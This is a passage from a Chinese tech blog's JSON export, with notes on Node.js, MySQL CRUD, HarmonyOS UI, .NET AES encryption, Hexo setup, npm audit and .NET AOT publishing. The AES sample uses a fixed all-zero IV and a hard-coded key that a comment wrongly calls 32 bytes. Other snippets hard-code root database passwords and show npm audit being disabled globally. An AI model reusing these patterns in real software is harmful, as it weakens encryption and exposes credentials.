函数加上一些逻辑，用来找出浏览器请求的 URL 路径： router.js 12345function route(pathname) &#123; console.log(&quot;About to route a request for &quot; + pathname);&#125;exports.route = route; server.js 123456789101112131415161718192021var http = require(&quot;http&quot;);var url = require(&quot;url&quot;);function start(route) &#123; function onRequest(request, response) &#123; var pathname = url.parse(request.url).pathname; console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); route(pathname); response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end(); &#125; http.createServer(onRequest).listen(8888); console.log(&quot;Server has started.&quot;);&#125;exports.start = start; 12345//test.jsvar server = require(&quot;./server&quot;);var router = require(&quot;./router&quot;);server.start(router.route); 1node test.js 🙏Node.js 全局对象 javaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其所有属性都可以在程序的任何地方访问，即全局变量。 在浏览器 JavaScript 中，通常 window 是全局对象， 而 Node.js 中的全局对象是 global，所有全局变量（除了 global 本身以外）都是 global 对象的属性。 在 Node.js 我们可以直接访问到 global 的属性，而不需要在应用中包含它。 全局对象与全局变量 global 最根本的作用是作为全局变量的宿主。按照 ECMAScript 的定义，满足以下条 件的变量是全局变量： 在最外层定义的变量； 全局对象的属性； 隐式定义的变量（未定义直接赋值的变量）。 当你定义一个全局变量时，这个变量同时也会成为全局对象的属性，反之亦然。需要注 意的是，在 Node.js 中你不可能在最外层定义变量，因为所有用户代码都是属于当前模块的， 而模块本身不是最外层上下文。 注意： 最好不要使用 var 定义变量以避免引入全局变量，因为全局变量会污染命名空间，提高代码的耦合风险。 __filename __filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。 __dirname __dirname 表示当前执行脚本所在的目录。 setTimeout(cb, ms) setTimeout(cb, ms) 全局函数在指定的毫秒(ms)数后执行指定函数(cb)。：setTimeout() 只执行一次指定函数。 clearTimeout(t) clearTimeout( t ) 全局函数用于停止一个之前通过 setTimeout() 创建的定时器。 参数 t 是通过 setTimeout() 函数创建的定时器。 12345678function printHello()&#123; console.log( &quot;Hello, World!&quot;);&#125;// 两秒后执行以上函数var t = setTimeout(printHello, 2000);// 清除定时器clearTimeout(t); 执行 main.js 文件，代码如下所示: setInterval(cb, ms) setInterval(cb, ms) 全局函数在指定的毫秒(ms)数后执行指定函数(cb)。 返回一个代表定时器的句柄值。可以使用 clearInterval(t) 函数来清除定时器。 setInterval() 方法会不停地调用函数，直到 clearInterval() 被调用或窗口被关闭。 1234567function printHello()&#123; console.log( &quot;Hello, World!&quot;);&#125;// 两秒后执行以上函数setInterval(printHello, 2000); console console 用于提供控制台标准输出，它是由 Internet Explorer 的 JScript 引擎提供的调试工具，后来逐渐成为浏览器的实施标准。 console.log console.info console.error console.warn console.time(label) 输出时间，表示计时开始。 console.timeEnd(label) 结束时间，表示计时结束。 console.trace 1234567891011121314console.info(&quot;程序开始执行：&quot;);var counter = 10;console.log(&quot;计数: %d&quot;, counter);console.time(&quot;获取数据&quot;);//for(var i = 0; i &lt; 100000; i++ )&#123;&#125;// console.timeEnd(&#x27;获取数据&#x27;);console.info(&quot;程序执行完毕。&quot;) process process 是一个全局变量，即 global 对象的属性。 1234567891011process.on(&#x27;exit&#x27;, function(code) &#123; // 以下代码永远不会执行 setTimeout(function() &#123; console.log(&quot;该代码不会执行&quot;); &#125;, 0); console.log(&#x27;退出码为:&#x27;, code);&#125;);console.log(&quot;程序执行结束&quot;); Process 属性 Process 提供了很多有用的属性，便于我们更好的控制系统的交互 stdout 标准输出流 stderr 标准错误流。 stdin 标准输入流。 argv argv 属性返回一个数组，由命令行执行脚本时的各个参数组成。它的第一个成员总是node，第二个成员是脚本文件名，其余成员是脚本文件的参数。 execPath 返回执行当前脚本的 Node 二进制文件的绝对路径。 execArgv 返回一个数组，成员是命令行下执行脚本时，在Node可执行文件与脚本文件之间的命令行参数。 env 返回一个对象，成员为当前 shell 的环境变量 exitCode 进程退出时的代码，如果进程优通过 process.exit() 退出，不需要指定退出码。 version Node 的版本，比如v0.10.18 config 一个包含用来编译当前 node 执行文件的 javascript 配置选项的对象。它与运行 .&#x2F;configure 脚本生成的 “config.gypi” 文件相同。 pid 当前进程的进程号。 title 进程名，默认值为”node”，可以自定义该值。 platform 运行程序所在的平台系统 ‘darwin’, ‘freebsd’, ‘linux’, ‘sunos’ 或 ‘win32’ arch 当前 CPU 的架构：’arm’、’ia32’ 或者 ‘x64’。 mainModule require.main 的备选方法。不同点，如果主模块在运行时改变，require.main可能会继续返回老的模块。可以认为，这两者引用了同一个模块。 1234567891011121314151617// 输出到终端process.stdout.write(&quot;Hello World!&quot; + &quot;\\n&quot;);// 通过参数读取process.argv.forEach(function(val, index, array) &#123; console.log(index + &#x27;: &#x27; + val);&#125;);// 获取执行路径console.log(process.execPath);// 平台信息console.log(process.platform);// 输出当前目录console.log(&#x27;当前目录: &#x27; + process.cwd());// 输出当前版本console.log(&#x27;当前版本: &#x27; + process.version);// 输出内存使用情况console.log(process.memoryUsage()); 🔭Node.js MySQL 1npm install mysql select 1234567891011121314151617181920212223242526272829var mysql = require(&#x27;mysql&#x27;); var connection = mysql.createConnection(&#123; host : &#x27;localhost&#x27;, user : &#x27;root&#x27;, password : &#x27;123456789&#x27;, //pwd port: &#x27;30306&#x27;, database: &#x27;IMDB&#x27; &#125;); connection.connect();var sql = &#x27;SELECT * FROM IMConfig;&#x27;;console.log(sql);//查connection.query(sql,function (err, result) &#123; if(err)&#123; console.log(&#x27;[SELECT ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------SELECT----------------------------&#x27;); console.log(result); console.log(&#x27;------------------------------------------------------------\\n\\n&#x27;); &#125;);connection.end(); ERROR 1045 (28000): Access denied for user ‘root‘@‘localhost‘ (using password: YES) 这边是通过docker安装的mysql，登录报错 root@f4a3881e5f06:&#x2F;# mysql -uroot -p Enter password: 123456 ERROR 1045 (28000): Access denied for user ‘root‘@’localhost’ (using password: YES) 如果常规的命令 mysql -uroot -p无法登录，使用命令尝试： mysql -u root -h 127.0.0.1 -p Error: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested mysql -u root -p ALTER USER ‘root‘@’%’ IDENTIFIED WITH mysql_native_password BY ‘123456789’; flush privileges; insert 123456789101112131415161718192021222324connection.connect();var addSql = &#x27;INSERT INTO IMConfig(ConfigID,UserID,ConfigName,ConfigCreateTime,ConfigType,ConfigSn) VALUES(0,?,?,?,?,?)&#x27;;var addSqlParams = [&#x27;1&#x27;, &#x27;11&#x27;,&#x27;2023-01-01&#x27;, &#x27;1&#x27;,&#x27;1&#x27;];//增connection.query(addSql,addSqlParams,function (err, result) &#123; if(err)&#123; console.log(&#x27;[INSERT ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------INSERT----------------------------&#x27;); //console.log(&#x27;INSERT ID:&#x27;,result.insertId); console.log(&#x27;INSERT ID:&#x27;,result); console.log(&#x27;-----------------------------------------------------------------\\n\\n&#x27;); &#125;);connection.end(); ER_NO_SUCH_TABLE: Table ‘IMDB.IMCONFIG’ doesn’t exist 中英文错误 ER_WRONG_VALUE_COUNT_ON_ROW: Column count doesn’t match value count at row 1 字段错误 ER_TRUNCATED_WRONG_VALUE: Incorrect datetime value: ‘2023-01-01T16:00:00.000Z’ for column ‘ConfigCreateTime’ at row 1 字段类型 update 1234567891011121314151617181920//update connection.connect();var modSql = &#x27;UPDATE IMConfig SET ConfigName = ?,ConfigType = ?,ConfigSn = ? WHERE ConfigId = ?&#x27;;var modSqlParams = [&#x27;lang&#x27;, &#x27;2&#x27;,&#x27;1&#x27;,5];//改connection.query(modSql,modSqlParams,function (err, result) &#123; if(err)&#123; console.log(&#x27;[UPDATE ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------UPDATE----------------------------&#x27;); console.log(&#x27;UPDATE affectedRows&#x27;,result.affectedRows); console.log(&#x27;-----------------------------------------------------------------\\n\\n&#x27;);&#125;);connection.end(); delete 12345678910111213141516171819connection.connect();var delSql = &#x27;DELETE FROM IMConfig where ConfigID=5&#x27;;//删connection.query(delSql,function (err, result) &#123; if(err)&#123; console.log(&#x27;[DELETE ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------DELETE----------------------------&#x27;); console.log(&#x27;DELETE affectedRows&#x27;,result.affectedRows); console.log(&#x27;-----------------------------------------------------------------\\n\\n&#x27;); &#125;);connection.end(); 🧵Node.js Socket socket client 123456789101112131415//skvar net = require(&#x27;net&#x27;);var client = net.connect(&#x27;6001&#x27;, &#x27;xxxx&#x27;, function()&#123; console.log(&#x27;已经与服务器连接&#x27;); client.write(&#x27;Yes\\r\\n&#x27;);&#125;);client.on(&#x27;data&#x27;, function(data)&#123; console.log(data.toString()); client.end();//one msg end&#125;);client.on(&#x27;end&#x27;, function()&#123; console.log(&#x27;客户端连接中断&#x27;);&#125;);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"},{"name":"Node.js","slug":"Node-js","permalink":"https://banjinmei.github.io/tags/Node-js/"},{"name":"helloworld","slug":"helloworld","permalink":"https://banjinmei.github.io/tags/helloworld/"},{"name":"event","slug":"event","permalink":"https://banjinmei.github.io/tags/event/"},{"name":"buffer","slug":"buffer","permalink":"https://banjinmei.github.io/tags/buffer/"},{"name":"stream","slug":"stream","permalink":"https://banjinmei.github.io/tags/stream/"},{"name":"c++","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"router","slug":"router","permalink":"https://banjinmei.github.io/tags/router/"}],"author":"mu"},{"title":"HarmonyOS Photos Column Swiper Grid","slug":"HarmonyOS-Photos","date":"2024-05-15T17:26:18.000Z","updated":"2024-12-15T05:10:25.304Z","comments":true,"path":"2024/05/16/HarmonyOS-Photos/","permalink":"https://banjinmei.github.io/2024/05/16/HarmonyOS-Photos/","excerpt":"","text":"​ ✨️indextitle swiper list(grid) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import coms from &#x27;../pages/com&#x27;@Entry@Componentstruct Index &#123; @State message: string = &#x27;Hello World1&#x27;//private list = new con build() &#123; Column() &#123; //标题 Row()&#123; Text(&#x27;photos&#x27;) .fontSize(&#x27;30fp&#x27;) .fontWeight(FontWeight.Bold) &#125; .justifyContent(FlexAlign.Start) .width(&#x27;100%&#x27;) .padding(&#x27;12vp&#x27;) //轮播 Swiper() &#123; ForEach(coms.SWIPERLIST,(item:Resource,index?:Number)=&gt;&#123; Row() &#123; Image(item) &#125; .width(&#x27;100%&#x27;) .aspectRatio(1.6) &#125;) &#125; .autoPlay(true) .loop(true) .indicator(true) .duration(1000) .itemSpace(10) .borderRadius(&#x27;12vp&#x27;) .margin(&#x27;12vp&#x27;) .onChange((index: number) =&gt; &#123; &#125;) //列表 Grid()&#123; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.icon&#x27;)) .borderRadius(2) &#125; &#125; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.icon&#x27;)) .borderRadius(2) &#125; &#125; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.icon&#x27;)) .borderRadius(2) &#125; &#125; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.44&#x27;)) .borderRadius(2) &#125; &#125; &#125; .columnsTemplate(&#x27;1fr 1fr&#x27;) .columnsGap(&#x27;12vp&#x27;) .rowsGap(&#x27;12vp&#x27;) //.padding(&#x27;2vp&#x27;) &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) &#125;&#125; 核心Grid的 1.columnsTemplate(&#x27;1fr 1fr &#x27;) 轮播数据 合并datadata 12345678910export default class com&#123; static SWIPERLIST:Array&lt;Resource&gt;=[ $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.22&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;) ]&#125; 列表数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445 static IMGLIST :Resource[][]=[ [ $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.22&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)], [ $r(&#x27;app.media.22&#x27;), $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)] , [ $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)] , [ $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)] ]// ForEach(coms.IMGLIST,(item:Array&lt; Resource&gt;,index?:Number)=&gt;&#123; GridItem()&#123; Column()&#123; Image(item[0]) .borderRadius(2) .aspectRatio(1.6) .borderRadius(&#x27;5vp&#x27;) .margin(&#x27;5vp&#x27;) // .padding(&#x27;5vp&#x27;) &#125; &#125; 🎈pagelist p2routerP2 123456.onClick(()=&gt;&#123; router.pushUrl(&#123; url:&#x27;pages/ListPage&#x27;, params:&#123;ptitem:item&#125; &#125;) &#125;) main_pages.js配置路由 123456789101112131415161718192021222324252627282930313233343536 //ts Record item:Array&lt;Resource&gt; = (router.getParams() as Record&lt;string, Array&lt;Resource&gt;&gt;).item;//... Navigation()&#123; Grid() &#123; ForEach(this.item,(item2: Resource,index?:Number)=&gt; &#123; GridItem() &#123; Image(item2) .borderRadius(2) .aspectRatio(1.6) .borderRadius(&#x27;5vp&#x27;) .margin(&#x27;5vp&#x27;) // .padding(&#x27;5vp&#x27;) &#125; &#125;) &#125; .columnsTemplate(&#x27;1fr 1fr 1fr&#x27;) .columnsGap(5) .rowsGap(5) .margin(&#x27;12vp&#x27;) &#125; .title(&#x27;p2&#x27;) .hideNavBar(false) .titleMode(NavigationTitleMode.Mini) hmos里面的console.log 12//log hilog.info(0x0000,&#x27;image&#x27;,&#x27;abc&#x27;); 🪄page p31234567891011121314151617181920item3:Resource = (router.getParams() as Record&lt;string, Resource&gt;).item3;// []build() &#123; Navigation()&#123; Image(this.item3) .borderRadius(2) .aspectRatio(1.6) .borderRadius(&#x27;5vp&#x27;) .margin(&#x27;5vp&#x27;) &#125; .title(&#x27;p3&#x27;) .hideNavBar(false) .titleMode(NavigationTitleMode.Mini) 备注 Image组件共有以下三种声明方式：（1）string格式，通常用来加载网络图片，若部署在真实设备上，需要申请网络访问权限 Image（”URL”）（2）PixelMap格式，可以加载像素图，常用在图片编辑中 Image（pixelMapObject）（3）Resource格式，加载本地图片（推荐） Image($r(‘app.media.xxx’))不需要带后缀名 地址：src&#x2F;main&#x2F;resources&#x2F;base&#x2F;media Image($rawfile(xxx.png))需要后缀，地址：src&#x2F;main&#x2F;resources&#x2F;rawfile end","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":".NET AES DES","slug":"NET-ASE-DES","date":"2024-05-15T07:01:42.000Z","updated":"2024-06-01T03:00:02.000Z","comments":true,"path":"2024/05/15/NET-ASE-DES/","permalink":"https://banjinmei.github.io/2024/05/15/NET-ASE-DES/","excerpt":"","text":".NET AES DES 对称加密 ASE 加密解密加密方法 (Encrypt): 创建一个 Aes 实例。设置密钥 (Key) 和初始化向量 (IV)。使用 CreateEncryptor 创建加密器。通过 CryptoStream 和 StreamWriter 将明文写入内存流，然后转换为 Base64 字符串。 解密方法 (Decrypt): 同样创建一个 Aes 实例。设置相同的密钥和初始化向量。使用 CreateDecryptor 创建解密器。通过 CryptoStream 和 StreamReader 从内存流读取密文并解密为明文。 注意事项密钥长度：AES 支持 128, 192, 和 256 位密钥。本例使用 256 位（32 字节）。初始化向量 (IV)：应确保加密和解密时使用相同的 IV。本例中使用了全零的 IV，在实际应用中建议使用随机 IV，并将其与密文一起存储。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566using System;using System.IO;using System.Security.Cryptography;using System.Text;class SymmetricEncryption&#123; // 加密方法 public static string Encrypt(string plainText, string key) &#123; using (Aes aesAlg = Aes.Create()) &#123; aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = new byte[16]; // 初始化向量 (IV) 可以设为全零，也可以使用随机值 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) &#123; using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) &#123; swEncrypt.Write(plainText); &#125; return Convert.ToBase64String(msEncrypt.ToArray()); &#125; &#125; &#125; // 解密方法 public static string Decrypt(string cipherText, string key) &#123; using (Aes aesAlg = Aes.Create()) &#123; aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = new byte[16]; // 与加密时使用相同的 IV ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText))) &#123; using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) using (StreamReader srDecrypt = new StreamReader(csDecrypt)) &#123; return srDecrypt.ReadToEnd(); &#125; &#125; &#125; &#125; // 示例主方法 public static void Main() &#123; string original = &quot;Hello, World!&quot;; string key = &quot;thisisaverysecretkey1234&quot;; // 32 字节的密钥 // 加密 string encrypted = Encrypt(original, key); Console.WriteLine($&quot;Encrypted: &#123;encrypted&#125;&quot;); // 解密 string decrypted = Decrypt(encrypted, key); Console.WriteLine($&quot;Decrypted: &#123;decrypted&#125;&quot;); &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AES","slug":"AES","permalink":"https://banjinmei.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://banjinmei.github.io/tags/DES/"}],"author":"mu"},{"title":"IOS POD","slug":"IOS-POD","date":"2024-05-14T02:51:59.000Z","updated":"2024-06-01T02:58:54.000Z","comments":true,"path":"2024/05/14/IOS-POD/","permalink":"https://banjinmei.github.io/2024/05/14/IOS-POD/","excerpt":"","text":"IOS POD 1brew install cocoapod 1gem install cocoapod 1sudo gem install cocoapod 1sudo brew update 1ruby update 1rvm install 2.7 cd xx 12pod install","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"IOD","slug":"IOD","permalink":"https://banjinmei.github.io/tags/IOD/"},{"name":"POD","slug":"POD","permalink":"https://banjinmei.github.io/tags/POD/"}],"author":"mu"},{"title":".NET webp","slug":"NET-Webp","date":"2024-05-10T01:28:17.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/10/NET-Webp/","permalink":"https://banjinmei.github.io/2024/05/10/NET-Webp/","excerpt":"","text":"在C#中，可以使用Image类和Bitmap类来处理图像，并且可以借助Magick.NET库来将JPG图片转换为WEBP格式。 安装Magick.NET-Q8-AnyCPU NuGet包。 1using ImageMagick; 转换方法 12345678910public void ConvertJpgToWebP2(string inputFilePath, string outputFilePath)&#123; using (var image = new MagickImage(inputFilePath)) &#123; // 设置WEBP压缩质量，范围从0（最好的质量）到100（最快速压缩） image.Quality = 80; image.Format = MagickFormat.WebP; image.Write(outputFilePath); &#125;&#125; 调用 1234string jpgPath = &quot;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.jpg&quot;;string webpPath = &quot;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.webp&quot;;Ig ig = new Ig();ig.ConvertJpgToWebP2(jpgPath, webpPath);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"webp","slug":"webp","permalink":"https://banjinmei.github.io/tags/webp/"}],"author":"mu"},{"title":"Hexo Categories Tags","slug":"Hexo-Categories-Tag","date":"2024-05-09T05:25:52.000Z","updated":"2024-06-01T02:58:12.000Z","comments":true,"path":"2024/05/09/Hexo-Categories-Tag/","permalink":"https://banjinmei.github.io/2024/05/09/Hexo-Categories-Tag/","excerpt":"","text":"配置categories新建页面categories:1hexo new page &quot;categories&quot; 执行命令后将新生成文件夹categories，并在该文件夹下生成index.md文件。 编辑categories&#x2F;index.md文件:vi {path}&#x2F;source&#x2F;categories&#x2F;index.md编辑内容： 12345---title: 分类date: 2017-10-25 22:00:00type: &quot;categories&quot;--- 编辑主题配置文件themes&#x2F;xx&#x2F;_config.yml:vi {path}&#x2F;themes&#x2F;xx&#x2F;_config.yml将menu中的categories的注释去掉： 123456789menu: home: / || home #tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 编辑文章在Front-matter区域（即—分隔的区域）指定categories即可：12345678---title: testdate: 2017-01-01 00:00:00categories: - 类别名称tags: - 标签--- 123456789101112131415categories/index.md---title: 分类date: 2024-05-08 22:00:00type: &quot;categories&quot;---- [分类](/categories/)- [分类-技术](/categories/技术/)- [分类-生活](/categories/生活/) 分类具有顺序性和层次性，而标签没有顺序和层次。 配置tags新建页面tags:1hexo new page &quot;tags&quot; 编辑tags&#x2F;index.md文件:1234567891011121314&lt;% if (site.tags.length)&#123; %&gt; &lt;aside&gt; &lt;div class=&quot;widget&quot;&gt; &lt;h3 class=&quot;widget-title&quot;&gt;标签云&lt;/h3&gt; &lt;div class=&quot;widget-content&quot;&gt; &lt;% site.tags.forEach(function(tag)&#123; %&gt; &lt;a href=&quot;&lt;%= url_for(tag.path) %&gt;&quot; style=&quot;font-size: &lt;%= tag.length %&gt;px;&quot;&gt;&lt;%= tag.name %&gt;&lt;/a&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/aside&gt;&lt;% &#125; %&gt; vi {path}&#x2F;source&#x2F;tags&#x2F;index.md编辑内容： 12345---title: 标签date: 2017-10-25 22:05:00type: &quot;tags&quot;--- 编辑主题配置文件themes&#x2F;xx&#x2F;_config.yml:vi {path}&#x2F;themes&#x2F;next&#x2F;_config.yml将menu中的tags的注释去掉： 123456789menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 文章指定tags的写法与categories一致，在Front-matter区域指定即可，写法可参考以上。 配置about新建页面about:1hexo new page &quot;about&quot; 编辑about&#x2F;index.md文件，内容可根据个人编写；vi {path}&#x2F;source&#x2F;about&#x2F;index.md 编辑主题配置文件themes&#x2F;xx&#x2F;_config.yml:vi {path}&#x2F;themes&#x2F;xx&#x2F;_config.yml将menu中的about的注释去掉： 1234567891011menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"Web uvpv busuanzi","slug":"Web-busuanzi","date":"2024-05-08T13:19:32.000Z","updated":"2024-06-01T03:09:14.000Z","comments":true,"path":"2024/05/08/Web-busuanzi/","permalink":"https://banjinmei.github.io/2024/05/08/Web-busuanzi/","excerpt":"","text":"WEB UVPV busuanzi 不蒜子不蒜子是一款用于静态网站的访问计数工具，可以方便地在网页上显示访问次数。与其他统计工具如百度统计和谷歌分析不同的是，不蒜子直接将访问次数显示在网页上，而不需要用户跳转到外部平台查看。 不蒜子的计数原理：通过在网页中引入JavaScript脚本，将当前页面的URL或某种唯一标识注册到不蒜子的服务器上，服务器保存着URL与对应的访问计数值。当页面被访问时，通过JavaScript更新服务器上的计数值，并在页面初始化时加载并显示计数值。 如何使用？在网页需要引用计数功能的地方先引入不蒜子的js 12&lt;!-- 引入不蒜子计数 --&gt;&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 为了美观，我们再引入旋转花瓣加载特效”fa fa-spinner fa-spin”总访问量计数算法：pv方式，单个用户连续点击n篇文章，记录n次访问量。总访客数计数算法：uv方式，单个用户连续点击n篇文章，只记录1次访客数。 123&lt;center&gt; 浏览量：&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;👀 | 访客数：&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;👦&lt;/center&gt; 注：美化及其他嵌入的改动，其实只要内层的span就可以，然后用css美化或者做嵌入","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"npm audit","slug":"Nodejs-npm-audit","date":"2024-05-08T11:11:07.000Z","updated":"2024-06-01T03:07:28.000Z","comments":true,"path":"2024/05/08/Nodejs-npm-audit/","permalink":"https://banjinmei.github.io/2024/05/08/Nodejs-npm-audit/","excerpt":"","text":"11 packages are looking for funding run npm fund for details 6 vulnerabilities (4 high, 2 critical) To address issues that do not require attention, run: npm audit fix To address all issues, run: npm audit fix –force Run npm audit for details. ———————————————— 这个报错信息的意思是： 依赖包已经是最新的，npm检查了xx个包，花了x秒钟。有x个包正在寻求资金支持，运行npm fund来查看详情，也可以选择捐赠一些钱给这些包的开发者。有x个中等程度的安全漏洞，运行npm audit fix –force来修复所有的问题，包括一些可能导致破坏性变化的问题。运行npm audit来查看更多的细节，包括每个漏洞的类型，来源，影响等。 解决方法 有时候并不想修复这些安全漏洞，因为它们可能会影响我们的项目的正常运行，或者我们只是想快速地初始化一个项目，不想被这些报错信息打扰,可以使用一个简单的命令来关闭npm的audit检查：npm set audit false这样就可以保证npm的audit不会影响初始化项目，但是这个解决办法并不建议使用在实际生产中，因为它会让我们忽略一些可能存在的安全风险。同样的，可以将值设为true来打开npm audit检查，这样可以看到npm的报错信息，也可以选择修复它们：npm set audit true这个操作将对全局生效，也就是说，它会影响我们所有的项目，不管是新的还是旧的。 修复~但不是破坏性修复 1npm audit fix","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"}],"author":"mu"},{"title":".NET native AOT","slug":"NET-AOT-native","date":"2024-05-08T05:01:11.000Z","updated":"2024-12-13T16:49:45.226Z","comments":true,"path":"2024/05/08/NET-AOT-native/","permalink":"https://banjinmei.github.io/2024/05/08/NET-AOT-native/","excerpt":"","text":"前言.NET8对于性能的优化是方方面面的，所以AOT预编译机器码也是不例外的。本篇来看下对于AOT的优化。 概述首先要明确一个概念，.NET里面的AOT它是原生的。什么意思呢？也就是说通过ILC编译器(AOT编译器，编译出来的代码是各个平台上可以直接运行的二进制代码。比如MacOS的二进制，Linux二进制等等。所以称之为原生。 C#源码被ILC编译之后，生成了一个完全原生态代码的可执行文件。在执行的时候不需要JIT来编译任何东西，因为JIT已经在ILC里面被充分利用过了。实际上AOT里面也没有包含JIT。那么它如何优化呢？只能是在ILC里面调用JIT的时候了。所以它这个优化依然依靠JIT。.NET8里面优化AOT的一个典型的例子，就是ASP.NET应用程序在使用AOT的时候表现不错，同时也降低了总成本。 创建项目启用AOT 打包指令1dotnet publish DemoAot.csproj -o pub\\ -c Release -r win-x64 linux下先安装SDK安装后 1dotnet --list-sdks 1dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r linux-x64 macos下安装SDK后 1dotnet --list-sdks 123456789101112131415161718192021222324252627282930313233dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r osx-x64``` # 重启服务器 通过命令 cd fser 及sudo nohup /root/fser/fileserver &gt; output&#123;当前时间&#125;.log 2&gt;&amp;1 &amp; 和命令 cd nets4 及sudo nohup dotnet /root/nets4/IM.dll &gt; output&#123;当前时间&#125;.log 2&gt;&amp;1 &amp; 自动化运行 为了自动化运行这些程序启动命令，可以编写一个 Shell 脚本并结合系统启动服务（如 systemd）来执行。以下是具体实现步骤：## 1. 创建 Shell 脚本编写一个脚本，比如命名为 start_services.sh：```bash#!/bin/bash# 获取当前时间作为日志文件名的一部分current_time=$(date +&quot;%Y-%m-%d_%H-%M-%S&quot;)# 启动 fileserver 程序cd /root/fser || exitsudo nohup /root/fser/fileserver &gt; &quot;output_$&#123;current_time&#125;.log&quot; 2&gt;&amp;1 &amp;# 启动 IM.dll 程序cd /root/nets4 || exitsudo nohup dotnet /root/nets4/IM.dll &gt; &quot;output_$&#123;current_time&#125;.log&quot; 